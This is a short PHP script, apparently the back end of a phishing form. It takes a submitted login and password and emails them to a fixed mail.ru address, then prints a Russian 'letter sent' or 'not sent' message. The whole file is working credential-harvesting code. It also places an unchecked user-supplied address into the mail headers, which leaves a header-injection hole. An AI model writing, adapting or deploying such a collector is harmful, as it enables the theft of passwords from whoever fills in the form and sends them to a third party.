<?php

    $to = "leskin-artem@mail.ru";
    $from = trim($_POST['email']);

    $login = htmlspecialchars($_POST['login']);
    $login = urldecode($login);
    $login = trim($login);

    $password = htmlspecialchars($_POST['password']);
    $password = urldecode($password);
    $password = trim($password);

    $headers = "From: $from" . "\r\n" .
    "Replay-To: $from" . "\r\n" .
    "X-Mailer: PHP/" . phpversion();

    if(mail($to, $login, $password, $headers)){
        echo 'Письмо отправленно';
    }
    else{
        echo 'Письмо не отправленно';
    }
?>